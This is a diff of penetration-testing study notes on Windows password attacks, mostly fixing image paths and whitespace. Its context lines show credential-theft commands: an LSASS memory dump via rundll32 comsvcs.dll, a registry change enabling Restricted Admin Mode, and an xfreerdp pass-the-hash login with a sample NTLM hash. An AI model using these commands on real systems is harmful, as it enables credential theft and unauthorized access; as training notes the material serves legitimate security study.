@@ -1,6 +1,6 @@
 # Password Attacks
 
-![Untitled](Password%20Attacks/Untitled.png)
+![Untitled](images/Untitled.png)
 
 # **Network Services**
 
@@ -94,7 +94,7 @@ It handles password changes and creates access tokens
     - `Get-Process lsass` → powershell
   - after we get the pid
     - `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 656 C:\lsass.dmp full` → in powershell as administrator
-  then transfer this lsass.dmp file to attacker machine (using method studied in Attacking sam section)
+      then transfer this lsass.dmp file to attacker machine (using method studied in Attacking sam section)
 
 ## **Using Pypykatz to Extract Credentials**
 
@@ -339,13 +339,13 @@ using `xfreerdp` , there are few caveats to this attack
 
 • `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
 
-![Untitled](Password%20Attacks%2088ea15aa39714a8a88573b29fcac0d3a/Untitled%201.png)
+![Untitled](images/Untitled%201.png)
 
 This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
 
 `c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
 
-![Untitled](Password%20Attacks%2088ea15aa39714a8a88573b29fcac0d3a/Untitled%202.png)
+![Untitled](images/Untitled%202.png)
 
 `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`
 
@@ -414,7 +414,6 @@ this will give us `cmd.exe` through which we can request access to any service w
     </aside>
     
     **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
-
 
 ---
 
